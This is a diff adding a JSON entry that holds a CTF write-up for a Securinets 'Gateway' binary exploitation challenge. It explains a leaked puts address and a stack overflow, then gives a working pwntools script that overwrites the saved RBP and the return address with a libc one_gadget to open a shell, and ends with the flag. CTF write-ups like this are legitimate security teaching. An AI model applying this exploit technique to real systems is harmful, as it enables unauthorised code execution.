@@ -41,6 +41,26 @@
        "Format string"
       ],
       "role": "player"
+     },
+     "gateway": {
+      "type": "file",
+      "title": "Gateway.md",
+      "date": "2026-10-02",
+      "category": "pwn",
+      "pts": "200",
+      "body": "This was a fun, beginner-friendly binary exploitation challenge from Securinets CTF. If you are new to Pwn and standard buffer overflows, this is a great starter challenge because it gives you a free leak to bypass ASLR!\n\nHere is how I approached and solved it step-by-step: \n\nWhen running the binary for the first time, it does two main things:\n-Prints out a line starting with wipe:  followed by a hex address (for example, wipe: 0x7f81a2080ed0).\n-Asks for user input at the prompt route: as shown here :\n\n\n![image](img:imuqu73q2lkl)\n\nlooking at the source \"main.c\" file \n\n![image](img:imuqu8hbpmdk)\n\nwe can clearly notice two main vulnerabilities : \nvuln n1: That output 0x7f81a2080ed0 is a memory leak of a C library function (puts), we can easily calculate the base address of libc in memory:\n                                                 `libc_base = leaked_puts_address - static_puts_offset`\nOnce we know libc_base, we know the location of everything inside libc\n\nvuln n2: When the binary asks for route:, it lets us type more characters than the stack buffer is meant to hold. \nBy testing different input lengths in GDB, we find that the stack layout looks like this:\n\n.0 to 16 bytes: Fills the local buffer.\n.Next 8 bytes: Overwrites the Saved Frame Pointer (RBP).\n.Next 8 bytes: Overwrites the Return Address (RIP).\n\nOverwriting RIP means we can redirect where the program jumps next!\n\nExploit strategy : \nSince we have control of execution and know where libc is loaded, we can use a one_gadget.\n\nA one_gadget is a specific location inside libc that automatically pops a shell (/bin/sh) with a single jump, provided certain CPU registers are happy.\n\nwe can use the one_gadget command inside the terminal as shown here :\n\n![image](img:imuqxbu3h5rh)\n\nbut in order to make out exploit work we need to satisfy the constraints written in red, lets take this as an example :\n\n![image](img:imuqxfqn6ey2)\n\nHere we need to overwrite Saved RBP with a safe, writable memory location inside the binary's .bss section (e.g., elf.sym.garage + 0x200 in our binary).\n\nNow we have a clear idea about the stack layout needed to solve this challenge : \n[16 bytes padding] +  [Fake valid rbp adress ] + [One_gadget to overwrite the return address and jumps directly into our shell shortcut ]\n\nand here is the python script  i ended up with : \n\n```python\n#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.log_level = \"error\"\nelf = ELF(\"./main\", checksec=False)\nlibc = ELF(\"./libc.so.6\", checksec=False)\n\np = process(\"./main\")\n\np.recvuntil(b\"wipe: \")\nputs = int(p.recvline(), 16)\nlibc.address = puts - libc.symbols['puts']\n\none_gadget = libc.address + 0xebd43\nfake_rbp = elf.sym.garage + 0x200\n\npayload = b\"A\"*16\npayload += p64(fake_rbp)\npayload += p64(one_gadget)\n\np.sendafter(b\"route:\\n\", payload)\np.interactive()\n\n```\n\n![image](img:imuqxnkvixg9)\n\nAS SIMPLE AS THAT. \n\nFlag :` Securinets{0n3_l34k_0n3_sh0t_z3r0_w4nt3d_st4rs}`\n\n\n",
+      "imgs": {
+       "imuqu73q2lkl": "images/2fe7267b63ed4a89.jpg",
+       "imuqu8hbpmdk": "images/866ca35cb9320b0b.jpg",
+       "imuqxbu3h5rh": "images/98fb84921fdf8eba.jpg",
+       "imuqxfqn6ey2": "images/63d83e3e8feec68f.jpg",
+       "imuqxnkvixg9": "images/4a29251d357baa6a.jpg"
+      },
+      "tags": [
+       "Rop",
+       "buffer overflow"
+      ],
+      "role": "player"
      }
     }
    }
